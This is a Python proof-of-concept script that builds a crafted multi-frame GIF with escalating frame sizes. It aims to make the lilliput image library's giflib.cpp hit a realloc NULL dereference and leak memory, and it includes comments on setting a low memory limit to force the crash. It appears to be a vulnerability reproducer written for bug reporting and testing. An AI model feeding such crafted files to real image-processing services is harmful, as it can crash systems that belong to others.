#!/usr/bin/env python3
"""
Reproducer: GIF realloc NULL Dereference in lilliput giflib.cpp

Creates a multi-frame GIF where each frame is progressively larger,
designed to maximize realloc pressure. To trigger the actual NULL dereference:
1. Set a low virtual memory limit: `ulimit -v 65536` (64MB)
2. Feed this GIF to lilliput
3. Observe crash when pixel buffer realloc fails

This also demonstrates the memory leak pattern even without the crash —
a properly instrumented run with valgrind or ASAN will show leaked memory.

Usage:
    python3 craft_gif_realloc.py > poc_realloc.gif
    ulimit -v 131072  # 128MB limit
    # Process poc_realloc.gif through lilliput
"""

import struct
import sys


def simple_lzw(pixels, min_code_size=8):
    """Minimal valid LZW for GIF pixel data."""
    clear = 1 << min_code_size
    eoi = clear + 1
    table = {bytes([i]): i for i in range(clear)}
    next_code = eoi + 1
    code_size = min_code_size + 1
    bits = []

    def emit(c):
        for i in range(code_size):
            bits.append((c >> i) & 1)

    emit(clear)
    buf = bytes()
    for p in pixels:
        ext = buf + bytes([p])
        if ext in table:
            buf = ext
        else:
            emit(table[buf])
            if next_code < 4096:
                table[ext] = next_code
                next_code += 1
                if next_code > (1 << code_size) and code_size < 12:
                    code_size += 1
            buf = bytes([p])
    if buf:
        emit(table[buf])
    emit(eoi)

    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = sum(bits[i + j] << j for j in range(8) if i + j < len(bits))
        result.append(byte)
    return bytes(result)


def subblocks(data):
    result = bytearray()
    i = 0
    while i < len(data):
        chunk = data[i:i+255]
        result.append(len(chunk))
        result.extend(chunk)
        i += 255
    result.append(0)
    return bytes(result)


def make_frame(width, height, left=0, top=0, color_idx=0):
    """Build a single GIF image descriptor + compressed image data."""
    out = bytearray()
    
    # Graphic Control Extension
    out += bytes([0x21, 0xF9, 0x04, 0x00, 0x0A, 0x00, 0x00, 0x00])
    
    # Image Descriptor
    out += bytes([0x2C])
    out += struct.pack('<HHHH', left, top, width, height)
    out += bytes([0x00])  # No local color table
    
    # Image data
    pixels = [color_idx % 256] * (width * height)
    compressed = simple_lzw(pixels, min_code_size=8)
    out += bytes([8])  # LZW minimum code size
    out += subblocks(compressed)
    
    return bytes(out)


def make_escalating_gif():
    """
    Multi-frame GIF where frames escalate in size.
    Frame sizes: 64x64, 128x128, 256x256, 512x512, 1024x1024
    Each frame forces a realloc of the pixel buffer to a larger size.
    Under memory pressure, a later realloc fails -> NULL dereference.
    """
    out = bytearray()
    
    # The largest frame determines canvas size
    max_w, max_h = 1024, 1024
    
    # GIF Header
    out += b'GIF89a'
    
    # Logical Screen Descriptor (canvas = max frame size)
    out += struct.pack('<HH', max_w, max_h)
    # Global color table: 256 entries (size field = 7 means 2^8 = 256)
    packed = 0b11110111  # GCT=1, res=7, sort=0, size=7 (256 colors)
    out += struct.pack('B', packed)
    out += struct.pack('B', 0)  # Background color index
    out += struct.pack('B', 0)  # Pixel aspect ratio
    
    # Global Color Table: 256 entries of varying colors
    for i in range(256):
        out += bytes([i, (i * 3) & 0xFF, (i * 7) & 0xFF])
    
    # NETSCAPE2.0 loop extension (loop forever)
    out += bytes([
        0x21, 0xFF, 0x0B,
        b'N'[0], b'E'[0], b'T'[0], b'S'[0], b'C'[0], b'A'[0], b'P'[0], b'E'[0],
        b'2'[0], b'.'[0], b'0'[0],
        0x03, 0x01, 0x00, 0x00,
        0x00,
    ])
    
    # Add frames with escalating sizes
    sizes = [(64, 64), (128, 128), (256, 256), (512, 512), (1024, 1024)]
    for idx, (w, h) in enumerate(sizes):
        out += make_frame(w, h, left=0, top=0, color_idx=idx * 50)
    
    # Trailer
    out += bytes([0x3B])
    
    return bytes(out)


if __name__ == '__main__':
    output_file = sys.argv[1] if len(sys.argv) > 1 else None
    gif_data = make_escalating_gif()
    
    if output_file:
        with open(output_file, 'wb') as f:
            f.write(gif_data)
        print(f"[+] Wrote {len(gif_data)} bytes to {output_file}")
        print(f"[+] 5 frames: 64x64, 128x128, 256x256, 512x512, 1024x1024")
        print(f"[+] Final pixel buffer realloc: 1024*1024 = 1,048,576 bytes")
        print(f"[+] Under memory pressure, realloc fails -> d->pixels = NULL")
        print(f"[+] To trigger: ulimit -v 65536 before processing")
    else:
        sys.stdout.buffer.write(gif_data)
